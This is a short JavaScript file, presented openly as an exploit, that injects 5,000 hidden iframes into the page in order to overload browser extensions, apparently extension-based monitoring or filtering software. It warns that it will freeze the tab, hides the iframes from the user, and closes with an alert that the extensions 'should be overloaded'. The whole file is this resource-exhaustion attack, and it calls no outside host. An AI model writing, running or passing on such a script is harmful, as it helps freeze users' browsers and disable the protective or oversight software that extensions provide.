// WARNING: This will likely freeze your current tab/browser 
// as it consumes massive amounts of RAM.

function launchExtPrinter() {
    const amount = 5000; // Number of iframes to generate
    const targetUrl = "about:blank"; // Can be any page

    console.log("Initializing ext pr3nter...");

    for (let i = 0; i < amount; i++) {
        // Create an iframe element
        let iframe = document.createElement('iframe');
        
        // Hide it so the user doesn't see thousands of boxes
        iframe.style.display = 'none';
        iframe.style.width = '0px';
        iframe.style.height = '0px';
        
        // Set source to force the extension to monitor the new process
        iframe.src = targetUrl;
        
        // Append to body to activate it
        document.body.appendChild(iframe);
    }
    
    alert("Exploit finished. Extensions should be overloaded.");
}

// To run: launchExtPrinter();
